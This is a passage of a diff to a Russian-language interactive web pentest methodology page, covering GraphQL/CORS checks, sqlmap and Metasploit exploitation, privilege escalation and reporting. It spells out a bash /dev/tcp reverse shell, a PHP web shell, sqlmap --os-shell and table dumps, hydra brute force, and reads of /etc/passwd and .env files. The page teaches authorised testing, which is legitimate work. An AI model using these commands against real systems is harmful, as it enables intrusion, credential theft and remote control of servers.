+  <p><b>Как:</b> Burp → Repeater → выделить несколько одинаковых запросов → правый клик → <code>Send group in parallel</code> (single-packet) — они уйдут фактически в один момент.</p>
+  <div class="tip">Признак, что тут есть гонка: логика «сначала проверить, потом изменить» и никаких блокировок/транзакций на стороне сервера.</div>
+  </div>
+  </details>
+</div>
+
+<div class="step" id="s22">
+  <h3><span class="num">4.9</span> GraphQL и CORS</h3>
+  <p class="why">Современные API ломаются не payload-ами, а отсутствием проверок на уровне полей и доверием к Origin.</p>
+<pre># GraphQL: интроспекция
+curl -s https://TARGET/graphql -H 'Content-Type: application/json' \
+  -d '{"query":"{__schema{types{name}}}"}'
+
+# CORS: проверь отражение Origin
+curl -s -I https://TARGET/api/me -H "Origin: https://evil.tld" | grep -i access-control</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p><b>GraphQL-проверки:</b></p>
+  <ul>
+  <li>интроспекция открыта в проде → вся схема видна</li>
+  <li>field-level auth: одно поле защищено, соседнее — нет</li>
+  <li>алиасы/батчинг для обхода rate limit</li>
+  <li>глубина запроса → DoS</li>
+  </ul>
+  <p><b>CORS-баги:</b></p>
+  <ul>
+  <li>сервер отражает любой <code>Origin</code> + <code>Access-Control-Allow-Credentials: true</code> → любой сайт может читать данные жертвы</li>
+  <li><code>Origin: null</code> разрешён</li>
+  <li>доверие к префиксу: разрешён <code>*.TARGET</code>, а там есть поддомен, который можно захватить</li>
+  </ul>
+  </div>
+  </details>
+</div>
+
+<!-- ═════ ФАЗА 5 ═════ -->
+<div class="phase" id="p5">
+  <h2>Фаза 5 · Эксплуатация</h2>
+  <p>Подтверждаем, что находка реально опасна. Не «похоже на баг», а воспроизводимый PoC.</p>
+</div>
+
+<div class="step" id="s23">
+  <h3><span class="num">5.1</span> sqlmap — по сохранённому запросу</h3>
+  <p class="why">Профессиональный порядок: точку входа ищешь руками в Burp, а массовый перебор техник отдаёшь sqlmap.</p>
+<pre># 1) в Burp: правый клик по запросу → Copy to file → req.txt
+# 2) затем:
+sqlmap -r req.txt --batch --level 3 --risk 1 --dbs -o sqlmap.txt
+
+# если есть WAF:
+sqlmap -r req.txt --batch --level 5 --risk 2 --tamper=space2comment,randomcase
+
+# выгрузка
+sqlmap -r req.txt --batch -D БАЗА -T users --dump
+sqlmap -r req.txt --batch --os-shell</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><span class="k">-r</span> — файл с полным HTTP-запросом (работает и для POST, и с cookie авторизации — это ключевое преимущество)</li>
+  <li><span class="k">--batch</span> — не спрашивать, отвечать по умолчанию</li>
+  <li><span class="k">--level</span> 1-5 — сколько техник пробовать (5 = долго, но thorough)</li>
+  <li><span class="k">--risk</span> 1-3 — рискованность (3 может изменить данные)</li>
+  <li><span class="k">--tamper</span> — скрипты обхода WAF (меняют вид payload: комментарии вместо пробелов, случайный регистр)</li>
+  <li><span class="k">--os-shell</span> — командная строка на сервере (если права позволяют)</li>
+  </ul>
+  <p><b>Что смотреть:</b> <span class="v">is injectable</span> → инъекция есть. Дальше — дамп, затем <code>--os-shell</code> → Фаза 6.</p>
+  </div>
+  </details>
+</div>
+
+<div class="step" id="s24">
+  <h3><span class="num">5.2</span> Metasploit — по найденному CVE</h3>
+  <p class="why">Nuclei сказал «здесь CVE-XXXX». Metasploit даёт готовый эксплойт под него.</p>
 <pre>msfconsole -q
-msf6&gt; search &lt;cve-номер или название из nuclei&gt;
-msf6&gt; use exploit/&lt;путь из поиска&gt;
+msf6&gt; search CVE-XXXX-XXXX
+msf6&gt; use exploit/ПУТЬ_ИЗ_ПОИСКА
 msf6&gt; set RHOSTS IP_ЦЕЛИ
-msf6&gt; set RPORT 443          ← 80 если http
-msf6&gt; set SSL true           ← true для https
+msf6&gt; set RPORT 443
+msf6&gt; set SSL true
 msf6&gt; set TARGETURI /
-msf6&gt; set LHOST &lt;твой_IP&gt;    ← ip a
+msf6&gt; set LHOST ТВОЙ_IP
 msf6&gt; set LPORT 4444
 msf6&gt; run</pre>
-<p><span class="flag">RHOSTS</span>=куда стреляем · <span class="flag">RPORT</span>=порт ·
-<span class="flag">SSL</span>=https · <span class="flag">LHOST</span>=твой IP · <span class="flag">LPORT</span>=порт приёма</p>
-<p>Появился <code>meterpreter &gt;</code> → <code>shell</code> → <code>whoami</code></p>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><span class="k">RHOSTS</span> — чужой адрес (цель) · <span class="k">RPORT</span> — порт (80 без SSL, 443 с SSL) · <span class="k">SSL</span> — https</li>
+  <li><span class="k">TARGETURI</span> — путь, где живёт уязвимость</li>
+  <li><span class="k">LHOST</span> — <b>твой</b> адрес (узнать: <code>ip a</code>) · <span class="k">LPORT</span> — порт, куда придёт соединение</li>
+  </ul>
+  <p>После <code>run</code> при успехе появляется <code>meterpreter &gt;</code> → команда <code>shell</code> → системная оболочка.</p>
+  <p><b>Развилки по типу находки:</b></p>
+  <table>
+  <tr><th>Nuclei показал</th><th>Модуль Metasploit</th></tr>
+  <tr><td>[rce] [cve]</td><td><code>exploit/multi/http/...</code> под конкретный CVE</td></tr>
+  <tr><td>[sqli]</td><td><code>auxiliary/scanner/http/..._sqli</code> или sqlmap</td></tr>
+  <tr><td>[lfi] / traversal</td><td><code>exploit/multi/http/...</code> + ручная проверка <code>?file=../../../../etc/passwd</code></td></tr>
+  <tr><td>[misconfig] логин-панель</td><td><code>auxiliary/scanner/http/..._bruteforce_login</code> или hydra</td></tr>
+  </table>
+  <p><b>Если модуля нет:</b> <code>searchsploit сервис версия</code> → берёшь публичный PoC (python/sh) и запускаешь вручную.</p>
+  </div>
+  </details>
 </div>
 
-<button class="red" onclick="show('m2')">[critical] [cve] → SQL-инъекция</button>
-<div class="next msf" id="m2">
-<h3>Metasploit · <span class="vuln">[SQL Injection — название компонента/плагина из nuclei]</span></h3>
-<pre>msfconsole -q
-msf6&gt; search &lt;название&gt; sqli
-msf6&gt; use auxiliary/scanner/http/&lt;модуль из поиска&gt;
-msf6&gt; set RHOSTS IP_ЦЕЛИ
-msf6&gt; set TARGETURI /путь/из/nuclei
-msf6&gt; run</pre>
-<p>Либо sqlmap — Шаг 8: <code>sqlmap -u "URL" --batch --dbs</code></p>
+<!-- ═════ ФАЗА 6 ═════ -->
+<div class="phase" id="p6">
+  <h2>Фаза 6 · После получения доступа</h2>
+  <p>Доступ — это не конец. Нужно понять, что можно с него сделать, и закрепиться (в рамках согласованного).</p>
 </div>
 
-<button class="red" onclick="show('m3')">[high] [cve] → Path Traversal / LFI</button>
-<div class="next msf" id="m3">
-<h3>Metasploit · <span class="vuln">[LFI / Path Traversal]</span></h3>
-<pre>msfconsole -q
-msf6&gt; search &lt;cve-номер&gt;
-msf6&gt; use exploit/&lt;модуль&gt;
-msf6&gt; set RHOSTS IP_ЦЕЛИ
-msf6&gt; set TARGETURI /
-msf6&gt; set LHOST &lt;твой_IP&gt;
-msf6&gt; run</pre>
-<p>Быстрая проверка руками: <code>?file=../../../../etc/passwd</code></p>
-</div>
+<div class="step" id="s25">
+  <h3><span class="num">6.1</span> Обратный шелл</h3>
+  <p class="why">Сервер сам подключается к тебе — так обходят запрет на входящие соединения.</p>
+<pre># у себя: ждём
+nc -lvnp 4444
 
-<button class="red" onclick="show('m4')">[high] [misconfig] → открытая панель</button>
-<div class="next msf" id="m4">
-<h3>Metasploit · <span class="vuln">[Exposed Admin Panel / Default Login — misconfig]</span></h3>
-<pre>msfconsole -q
-msf6&gt; use auxiliary/scanner/http/&lt;brute-force модуль под CMS&gt;
-msf6&gt; set RHOSTS IP_ЦЕЛИ
-msf6&gt; set USERNAME admin
-msf6&gt; set PASS_FILE /usr/share/wordlists/rockyou.txt
-msf6&gt; set TARGETURI /путь/к/логину
-msf6&gt; run</pre>
-<p><span class="flag">USERNAME</span>=логин · <span class="flag">PASS_FILE</span>=словарь · <span class="flag">TARGETURI</span>=путь формы</p>
-</div>
-
-<button onclick="show('m5')">Пусто (No results found)</button>
-<div class="next" id="m5">→ пусто ≠ сайт чист, просто эта категория чиста → Шаг 8</div>
-<br><button class="go" onclick="go('step8')">Шаг 8 →</button>
-</div>
-<div class="arrow">▼</div>
-
-<!-- ═══ ШАГ 8 ═══ -->
-<div class="step" id="step8">
-<h2><span class="badge">Шаг 8</span> SQL-инъекция (sqlmap)</h2>
-<p class="why">Сайт берёт данные из базы. Если параметр адреса подставляется в запрос без проверки — можно вытащить всю базу.</p>
-<pre>sqlmap -u "https://TARGET/page.php?id=1" \
-  --batch --level 3 --risk 1 --dbs</pre>
-
-<details class="explain">
-<summary>Что это значит (объяснение)</summary>
-<div class="body">
-<ul>
-<li>Нужен адрес <b>с параметром</b> (<code>?id=1</code>, <code>?page=2</code>) — это и есть «входная точка»</li>
-<li><span class="k">--batch</span> — не задавать вопросы, отвечать по умолчанию</li>
-<li><span class="k">--level</span> — сколько техник пробовать: <b>1</b>=минимум, <b>3</b>=норма, <b>5</b>=максимум (долго)</li>
-<li><span class="k">--risk</span> — насколько рискованно: <b>1</b>=безопасно, <b>2</b>=средне, <b>3</b>=может изменить данные</li>
-<li><span class="k">--dbs</span> — показать список баз данных</li>
-</ul>
-<p><b>Что смотреть:</b> <span class="v">is injectable</span> = инъекция есть.</p>
-</div>
-</details>
-
-<div class="branch">Развилки:</div>
-<button onclick="show('m6')">is injectable</button>
-<div class="next msf" id="m6">
-<h3><span class="vuln">[SQL Injection — подтверждена]</span></h3>
-<pre>sqlmap -u "URL" --batch -D &lt;база&gt; -T users --dump
-sqlmap -u "URL" --batch --os-shell</pre>
-<p>После <code>os-shell&gt;</code> — обратный шелл:</p>
-<pre>nc -lvnp 4444                                    ← у себя
-os-shell&gt; bash -c "bash -i &gt;&amp; /dev/tcp/&lt;твой_IP&gt;/4444 0&gt;&amp;1"</pre>
-</div>
-<button onclick="show('m7')">not injectable — форма POST</button>
-<div class="next" id="m7">
-<pre># сохрани запрос из Burp в req.txt:
-sqlmap -r req.txt --batch --level 3 --risk 1 --dbs</pre>
-→ тоже пусто → Шаг 9
-</div>
-<br><button class="go" onclick="go('step9')">Шаг 9 →</button>
-</div>
-<div class="arrow">▼</div>
-
-<!-- ═══ ШАГ 9 ═══ -->
-<div class="step" id="step9">
-<h2><span class="badge">Шаг 9</span> Вход в панель (hydra)</h2>
-<p class="why">Форма входа найдена — часто пароль стандартный или из словаря.</p>
-<pre>hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET \
-  http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=Invalid" -t 4</pre>
-
-<details class="explain">
-<summary>Что это значит (объяснение)</summary>
-<div class="body">
-<p>Сначала <b>руками</b>: <code>admin:admin</code>, <code>admin:password</code>, <code>admin:123456</code>.
-Потом в браузере (F12 → Network) смотрим имена полей и текст ошибки при неудаче.</p>
-<ul>
-<li><span class="k">-l</span> — один логин (маленькая L); <span class="k">-L</span> — файл со списком логинов</li>
-<li><span class="k">-P</span> — словарь паролей (большая P; маленькая <span class="k">-p</span> = один пароль)</li>
-<li><span class="k">http-post-form</span> — тип атаки «заполняем веб-форму»</li>
-<li>строка в кавычках = путь : поля : <span class="k">F=</span> текст при <b>неудачном</b> входе</li>
-<li><span class="k">-t</span> — сколько попыток одновременно (<b>4</b>=вежливо, <b>64</b>=громко)</li>
-</ul>
-</div>
-</details>
-
-<div class="branch">Развилки:</div>
-<button onclick="show('m8')">password: xxx</button>
-<div class="next" id="m8">→ зашёл в панель. Есть загрузка файла → залей <code>&lt;?php system($_GET['cmd']); ?&gt;</code> и открой <code>?cmd=whoami</code>. Есть редактор шаблона → вставь туда же.</div>
-<button onclick="show('m9')">0 valid password found</button>
-<div class="next" id="m9">→ другие логины (administrator, root, admin1) или Шаг 10</div>
-<br><button class="go" onclick="go('step10')">Шаг 10 →</button>
-</div>
-<div class="arrow">▼</div>
-
-<!-- ═══ ШАГ 10 ═══ -->
-<div class="step" id="step10">
-<h2><span class="badge">Шаг 10</span> Всё дало 0 — руками (Burp)</h2>
-<p class="why">Инструменты ищут только известные шаблоны. Логические ошибки находит человек.</p>
-<pre>burpsuite    # в браузере прокси 127.0.0.1:8080</pre>
-
-<details class="explain">
-<summary>Что это значит (объяснение)</summary>
-<div class="body">
-<p><b>Burp Suite</b> — «перехватчик»: показывает каждый запрос, который браузер отправляет, и даёт его править перед отправкой.</p>
-<p><b>Что искать:</b></p>
-<ul>
-<li>скрытые параметры: <code>?debug=1</code>, <code>?admin=true</code></li>
-<li>подмена чужих данных (IDOR): <code>user_id=5</code> → <code>1</code></li>
-<li>JWT в cookie, подмена цены в корзине</li>
-<li>отсутствие проверки на сервере (проверка только в браузере)</li>
-</ul>
-</div>
-</details>
-</div>
-
-<!-- ═══ ШАГ 8а ═══ -->
-<div class="step" id="step8a">
-<h2><span class="badge">Шаг 8а</span> Доступ получен — обратный шелл</h2>
-<p class="why">Сервер сам подключается к твоей машине, и ты получаешь командную строку на нём.</p>
-<pre>nc -lvnp 4444                           ← слушать у себя
-
-# на сервере:
+# на сервере (через --os-shell, RCE, редактор шаблона):
 bash -i >&amp; /dev/tcp/ТВОЙ_IP/4444 0>&amp;1
 
-# появилось www-data@…$ → получилось:
-whoami
-id
-sudo -l                                  ← что можно от root</pre>
+# стабильный TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'</pre>
 
-<details class="explain">
-<summary>Что это значит (объяснение)</summary>
-<div class="body">
-<p><b>nc</b> (netcat) — «телефон»: ждёт входящее соединение на порту.
-<span class="k">-l</span>=слушать, <span class="k">-v</span>=подробно, <span class="k">-n</span>=без DNS, <span class="k">-p</span>=номер порта.</p>
-<p>Затем на сервере запускается команда, которая «звонит» тебе через <code>/dev/tcp</code> — так bash умеет делать TCP-соединение без сторонних программ.</p>
-<p>Когда видишь приглашение <span class="v">www-data@server:~$</span> — ты внутри. Дальше <code>sudo -l</code> показывает, какие команды можно запускать от root.</p>
-</div>
-</details>
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><span class="k">nc -lvnp</span>: <b>l</b>isten — слушать, <b>v</b>erbose — подробно, <b>n</b>o-DNS — не резолвить, <b>p</b>ort — номер</li>
+  <li><code>/dev/tcp</code> — встроенный в bash способ открыть TCP-соединение, сторонние программы не нужны</li>
+  <li><code>&gt;&amp;</code> — перенаправить вывод и ошибки в соединение, <code>0&gt;&amp;1</code> — ввод тоже</li>
+  </ul>
+  <p>Признак успеха: приглашение вида <span class="v">www-data@host:~$</span>.</p>
+  <p>Альтернативы, если bash нет: <code>python3 -c 'import socket,subprocess,os;...'</code>, <code>php -r '$sock=fsockopen(...)'</code>, <code>nc -e /bin/bash</code>.</p>
+  </div>
+  </details>
 </div>
 
-<!-- ══════ ЗАМЕТКИ ══════ -->
+<div class="step" id="s26">
+  <h3><span class="num">6.2</span> Что дальше на сервере</h3>
+  <p class="why">Зафиксировать факт доступа, показать импакт, найти путь к root — в рамках согласованных правил.</p>
+<pre>whoami; id; hostname; uname -a
+cat /etc/passwd
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+ls -la /var/www; cat /var/www/html/.env 2>/dev/null
+./linpeas.sh -a</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <ul>
+  <li><span class="k">id</span> — в каких группах ты (docker, sudo, adm — это пути к root)</li>
+  <li><span class="k">sudo -l</span> — какие команды разрешены от root. <b>Самое важное</b>: если есть NOPASSWD на vim/find/bash — root за секунду</li>
+  <li><span class="k">find -perm -4000</span> — SUID-бинарники: смотри на gtfobins.github.io, есть ли эксплойт</li>
+  <li><b>linpeas</b> — скрипт, который сам перебирает сотни способов эскалации</li>
+  </ul>
+  <p>Пример: <code>sudo -l</code> показал <code>(ALL) NOPASSWD: /usr/bin/vim</code> → <code>sudo vim -c '!sh'</code> → root.</p>
+  <div class="warn">Не выгружай реальные пользовательские данные больше, чем нужно для PoC. Для отчёта хватает 3-5 строк из таблицы, а не всей базы.</div>
+  </div>
+  </details>
+</div>
+
+<!-- ═════ ФАЗА 7 ═════ -->
+<div class="phase" id="p7">
+  <h2>Фаза 7 · Отчёт</h2>
+  <p>Отчёт — это продукт теста. Плохой отчёт превращает критический баг в «informative».</p>
+</div>
+
+<div class="step" id="s27">
+  <h3><span class="num">7.1</span> Структура отчёта (impact-first)</h3>
+  <p class="why">Сначала — что получит атакующий. Потом — как это воспроизвести.</p>
+<pre>1. Заголовок: [Критично] Любой пользователь может отменить чужой заказ
+2. Impact: атакующий без прав получает контроль над заказами всех клиентов
+3. Шаги воспроизведения (нумерованные, точные, с ролями)
+4. PoC: запрос + ответ + скриншот/видео
+5. Причина: отсутствие проверки владельца на /api/orders/{id}
+6. Фикс: серверная проверка owner_id == session.user_id
+7. Оценка: CVSS / критичность</pre>
+
+  <details class="explain">
+  <summary>Что это значит (объяснение)</summary>
+  <div class="body">
+  <p><b>Правило из практики:</b> клиент не будет исправлять XSS, если ты напишешь «параметр отражается». Покажи payload, который крадёт cookie админа, со скриншотом.</p>
+  <ul>
+  <li><b>Impact-first</b> — первая строка про последствия, а не про технику</li>
+  <li><b>Воспроизводимость</b> — любой инженер должен повторить по шагам без вопросов</li>
+  <li><b>Скриншоты по ходу</b> — сохраняй сразу, потом не восстановишь</li>
+  <li><b>Мера</b> — не преувеличивай: неверная оценка ломает доверие</li>
+  </ul>
+  <p><b>Инструменты:</b> Dradis, Pwndoc, Faraday, Obsidian/Notion — шаблоны отчётов и учёт находок.</p>
+  </div>
+  </details>
+</div>
+
+<!-- ═════ СПРАВОЧНИКИ ═════ -->
+<div class="phase" id="extra">
+  <h2>Справочники</h2>
+  <p>То, что стоит держать перед глазами во время теста.</p>
+</div>
+
+<div class="step" id="chains">
+  <h3><span class="num">A</span> Цепочки: как «мелочь» становится «критично»</h3>
+  <p class="why">Одиночный низкий баг почти ничего не стоит. Цепочка — стоит дорого.</p>
+  <table>
+  <tr><th>Компоненты</th><th>Результат</th></tr>
+  <tr><td>CORS misconfig + Open Redirect + OAuth без state</td><td><b>Захват аккаунта</b></td></tr>
+  <tr><td>Open redirect + утечка токена в referer</td><td><b>Кража токена</b></td></tr>
+  <tr><td>XSS + отсутствие HttpOnly</td><td><b>Угон сессии</b></td></tr>
+  <tr><td>SSRF + облачные метаданные</td><td><b>Ключи облака / RCE</b></td></tr>
+  <tr><td>Загрузка файла + открытый каталог</td><td><b>RCE</b></td></tr>
+  <tr><td>LFI + лог-файл (log poisoning)</td><td><b>RCE</b></td></tr>
+  <tr><td>IDOR чтения + IDOR записи</td><td><b>Смена пароля чужого юзера</b></td></tr>
+  <tr><td>Subdomain takeover + cookie на домене</td><td><b>Кража сессий поддоменов</b></td></tr>
+  <tr><td>Захват поддомена, разрешённого в CORS</td><td><b>Чтение API жертвы</b></td></tr>
+  </table>
+  <div class="tip">Веди «журнал находок» в заметках справа: каждая запись — строка вида «эндпоинт — класс — уверенность». Потом смотришь, что с чем стыкуется.</div>
+</div>
+
+<div class="step" id="flags">
+  <h3><span class="num">B</span> Шпаргалка: флаги и шкалы</h3>
+  <table>
+  <tr><th>Флаг</th><th>Смысл</th><th>Шкала / значения</th></tr>
+  <tr><td><span class="k">-a</span> (whatweb)</td><td>агрессивность</td><td>1 stealthy · 2 polite · 3 aggressive · 4 heavy</td></tr>
+  <tr><td><span class="k">-a</span> (wafw00f)</td><td>проверить все WAF</td><td>флаг без значения</td></tr>
+  <tr><td><span class="k">-T</span> (nmap)</td><td>скорость</td><td>0 paranoid · 1 sneaky · 2 polite · 3 normal · 4 aggressive · 5 insane</td></tr>
+  <tr><td><span class="k">-sV / -sC</span></td><td>версии / скрипты</td><td>—</td></tr>
+  <tr><td><span class="k">-p-</span></td><td>все порты</td><td>1-65535</td></tr>
+  <tr><td><span class="k">-t</span></td><td>потоков</td><td>10 тихо · 50 быстро · 100+ рискованно</td></tr>
+  <tr><td><span class="k">-mc</span> (ffuf)</td><td>какие коды = находка</td><td>200,204,301,302,307,401,403</td></tr>
+  <tr><td><span class="k">-fs / -fw / -fl</span></td><td>фильтр размера/слов/строк</td><td>число</td></tr>
+  <tr><td><span class="k">-severity</span> (nuclei)</td><td>важность</td><td>info → low → medium → high → critical</td></tr>
+  <tr><td><span class="k">-c</span> (nuclei)</td><td>параллельных шаблонов</td><td>25 тихо · 100 быстро · 200+ громко</td></tr>
+  <tr><td><span class="k">-rl</span> (nuclei)</td><td>запросов в секунду</td><td>50 вежливо · 300 громко</td></tr>
+  <tr><td><span class="k">--level</span> (sqlmap)</td><td>глубина техник</td><td>1 … 5</td></tr>
+  <tr><td><span class="k">--risk</span> (sqlmap)</td><td>рискованность</td><td>1 безопасно · 2 средне · 3 может изменить данные</td></tr>
+  <tr><td><span class="k">--tamper</span> (sqlmap)</td><td>обход WAF</td><td>space2comment, randomcase, between</td></tr>
+  <tr><td><span class="k">-l / -L</span> (hydra)</td><td>один логин / список</td><td>—</td></tr>
+  <tr><td><span class="k">-p / -P</span> (hydra)</td><td>один пароль / словарь</td><td>—</td></tr>
+  <tr><td><span class="k">-Tuning</span> (nikto)</td><td>категории тестов</td><td>1 файлы · 2 конфиги · 3 инфо · 4 инъекции · 8 RCE · 9 SQLi · 6 DoS</td></tr>
+  <tr><td><span class="k">RHOSTS / LHOST</span> (msf)</td><td>цель / твой адрес</td><td>IP</td></tr>
+  </table>
+</div>
+
+<div class="step" id="anti">
+  <h3><span class="num">C</span> Анти-паттерны (чего не делают профи)</h3>
+  <table>
+  <tr><th>Ошибка</th><th>Почему плохо</th></tr>
+  <tr><td>Spray and pray: одни и те же шаблоны по тысячам хостов</td><td>WAF считает шумом, находок ноль</td></tr>
+  <tr><td>Синдром коллекционера тулзов</td><td>50 программ, ни одного прочитанного вывода</td></tr>
+  <tr><td>Тестировать только главную страницу</td><td>80% поверхности — за авторизацией</td></tr>
+  <tr><td>Верить «сканер чист → сайт чист»</td><td>Доступ и логика сканером структурно не проверяются</td></tr>
+  <tr><td>Тестировать в одной роли</td><td>Баги доступа видны только при сравнении ролей</td></tr>
+  <tr><td>Слепой фаззинг 5-миллионным словарём</td><td>Шум, бан, потеря времени. Сначала стек → потом словарь</td></tr>
+  <tr><td>Игнорировать нестандартные порты 3000/5000/8080/9090</td><td>Там внутренние панели без защиты</td></tr>
+  <tr><td>Отчёт без импакта («параметр отражается»)</td><td>Находку не приоритизируют, деньги не платят</td></tr>
+  <tr><td>Не документировать по ходу</td><td>К концу дня не восстановишь точные шаги PoC</td></tr>
+  <tr><td>Останавливаться на первой находке</td><td>Та же дыра обычно есть ещё в пяти местах</td></tr>
+  </table>
+</div>
+
+<div class="step" id="src">
+  <h3><span class="num">D</span> Источники, на которых это построено</h3>
+  <table>
+  <tr><th>Источник</th><th>Что взято</th></tr>
+  <tr><td>PTES (Penetration Testing Execution Standard)</td><td>7 фаз: pre-engagement → intel → threat model → vuln analysis → exploit → post-exploit → report</td></tr>
+  <tr><td>OWASP WSTG</td><td>11 категорий тестов: info, config, identity, authn, authz, session, input, errors, crypto, business logic, client-side</td></tr>
+  <tr><td>chs.us — Bug Bounty Methodology</td><td>«хантер против хирурга», 3 ловушки, recon-конвейер, оценка классов, chain-мышление</td></tr>
+  <tr><td>GitHub-методологии 2025-2026</td><td>конкретные конвейеры: subfinder → httpx → katana/gau → nuclei; JS-анализ; arjun</td></tr>
+  <tr><td>dev.to — «Clean scanner report is not the same as a clean app»</td><td>ритуал двух аккаунтов, почему сканер не видит доступ</td></tr>
+  <tr><td>TryHackMe / Cobalt / Astra / SecureLayer7 гайды</td><td>порядок фаз, разница scan vs assessment, формат отчёта</td></tr>
+  <tr><td>PortSwigger / практика Burp</td><td>sitemap, Repeater, параллельные запросы, DOM-investigator</td></tr>
+  </table>
+  <p><b>Как этим пользоваться:</b> иди по фазам сверху вниз. Внутри каждого шага — команда, потом «Что это значит», потом развилки. Пустой вывод не провал, а сигнал идти дальше. Дошёл до Фазы 3 — включай голову: там начинается то, что ни один сканер не сделает.</p>
+</div>
+
+<!-- ═════ ЗАМЕТКИ ═════ -->
 <button id="notesToggle" onclick="toggleNotes()">📝 Заметки</button>
 <aside id="notes">
   <header>
     <h2>Заметки</h2>
     <button onclick="toggleNotes()" title="Свернуть">✕</button>
   </header>
-  <textarea id="notesArea" placeholder="Находки, вывод команд, пароли, TODO…
+  <textarea id="notesArea" placeholder="Журнал находок и TODO:
 
-— nmap: …
-— whatweb: …
+— цель: …
+— субдомены: N живых, интересные: …
+— стек: …
 — nuclei: …
+— IDOR: эндпоинт / метод / роль → уверенность
 — TODO: …"></textarea>
   <footer>
     <button onclick="copyNotes()">Копировать</button>
@@ -616,54 +1138,80 @@ sudo -l                                  ← что можно от root</pre>
 </aside>
 
 <script>
-/* ══ Подстановка цели ══ */
-let TARGET = 'example.com';
+/* ═════ ПОДСТАНОВКА ЦЕЛИ / IP ═════ */
+const TARGET_DEFAULT = 'example.com';
+let TARGET = TARGET_DEFAULT, IP = 'IP_ЦЕЛИ', LHOST = 'ТВОЙ_IP';
 
-function applyTarget(){
-  let v = document.getElementById('targetInput').value.trim();
-  v = v.replace(/^https?:\/\//,'').replace(/\/$/,'');
-  if (!v) return;
-  TARGET = v;
+function applyInputs(){
+  const t = document.getElementById('inTarget').value.trim()
+              .replace(/^https?:\/\//,'').replace(/\/$/,'');
+  const ip = document.getElementById('inIp').value.trim();
+  const lh = document.getElementById('inLhost').value.trim();
+  if (t) TARGET = t;
+  if (ip) IP = ip;
+  if (lh) LHOST = lh;
 
-  document.querySelectorAll('pre, code').forEach(el => {
+  document.querySelectorAll('pre, code').forEach(el=>{
     if (el.dataset.orig === undefined) el.dataset.orig = el.innerHTML;
-    let html = el.dataset.orig.split('TARGET').join(TARGET);
+    let html = el.dataset.orig;
+    html = html.split('TARGET').join(TARGET);
+    html = html.split('IP_ЦЕЛИ').join(IP);
+    html = html.split('ТВОЙ_IP').join(LHOST);
     el.innerHTML = html;
   });
 
-  const hint = document.getElementById('savedHint');
-  hint.textContent = '✓ цель: ' + TARGET;
-  hint.classList.add('show');
-  setTimeout(() => { hint.classList.remove('show'); hint.textContent = '✓ сохранено'; }, 1600);
+  const h = document.getElementById('savedHint');
+  h.textContent = '✓ ' + TARGET;
+  h.classList.add('show');
+  setTimeout(()=>{h.classList.remove('show'); h.textContent='✓ сохранено';}, 1600);
 }
+document.getElementById('inTarget').addEventListener('keydown', e=>{ if(e.key==='Enter') applyInputs(); });
+document.getElementById('inIp').addEventListener('keydown', e=>{ if(e.key==='Enter') applyInputs(); });
+applyInputs();
 
-document.getElementById('targetInput').addEventListener('keydown', e => {
-  if (e.key === 'Enter') applyTarget();
-});
-applyTarget();
-
-/* ══ Раскрывашки развилок ══ */
+/* ═════ РАЗВИЛКИ (если появятся в разметке) ═════ */
 function show(id){
   const el = document.getElementById(id);
+  if (!el) return;
   el.style.display = el.style.display === 'block' ? 'none' : 'block';
 }
-function go(id){ document.getElementById(id).scrollIntoView({behavior:'smooth'}); }
+function go(id){
+  const el = document.getElementById(id);
+  if (el) el.scrollIntoView({behavior:'smooth'});
+}
 
-/* ══ Заметки ══ */
-const KEY = 'webcheck_notes_v1';
+/* ═════ КОПИРОВАНИЕ ПО КЛИКУ НА КОМАНДУ ═════ */
+document.addEventListener('click', e=>{
+  const pre = e.target.closest('pre');
+  if (!pre) return;
+  navigator.clipboard.writeText(pre.innerText).then(()=>{
+    pre.classList.add('copied');
+    setTimeout(()=>pre.classList.remove('copied'), 1200);
+  });
+});
+
+/* ═════ ОГЛАВЛЕНИЕ НА МОБИЛЬНОМ ═════ */
+document.querySelectorAll('#toc a').forEach(a=>{
+  a.addEventListener('click', ()=>{
+    if (window.innerWidth <= 1100) document.getElementById('toc').classList.remove('open');
+  });
+});
+
+/* ═════ ЗАМЕТКИ ═════ */
+const KEY = 'webtest_notes_v1';
 const area = document.getElementById('notesArea');
 const hint = document.getElementById('savedHint');
 let saveTimer = null;
 
 area.value = localStorage.getItem(KEY) || '';
 
-area.addEventListener('input', () => {
+area.addEventListener('input', ()=>{
   clearTimeout(saveTimer);
-  saveTimer = setTimeout(() => {
+  saveTimer = setTimeout(()=>{
     localStorage.setItem(KEY, area.value);
     hint.textContent = '✓ сохранено';
     hint.classList.add('show');
-    setTimeout(() => hint.classList.remove('show'), 1200);
+    setTimeout(()=>hint.classList.remove('show'), 1200);
   }, 400);
 });
 
@@ -676,10 +1224,10 @@ function toggleNotes(){
 }
 
 function copyNotes(){
-  navigator.clipboard.writeText(area.value).then(() => {
+  navigator.clipboard.writeText(area.value).then(()=>{
     hint.textContent = '✓ скопировано';
     hint.classList.add('show');
-    setTimeout(() => { hint.classList.remove('show'); hint.textContent = '✓ сохранено'; }, 1200);
+    setTimeout(()=>{hint.classList.remove('show'); hint.textContent='✓ сохранено';},1200);
   });
 }
 
@@ -687,25 +1235,25 @@ function downloadNotes(){
   const blob = new Blob([area.value], {type:'text/plain;charset=utf-8'});
   const a = document.createElement('a');
   a.href = URL.createObjectURL(blob);
-  a.download = 'webcheck_notes_' + new Date().toISOString().slice(0,10) + '.txt';
+  a.download = 'webtest_notes_' + new Date().toISOString().slice(0,10) + '.txt';
   a.click();
   URL.revokeObjectURL(a.href);
 }
 
 function clearNotes(){
-  if (confirm('Удалить все заметки?')) {
+  if (confirm('Удалить все заметки?')){
     area.value = '';
     localStorage.removeItem(KEY);
   }
 }
 
-document.addEventListener('keydown', e => {
-  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's') {
+document.addEventListener('keydown', e=>{
+  if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's'){
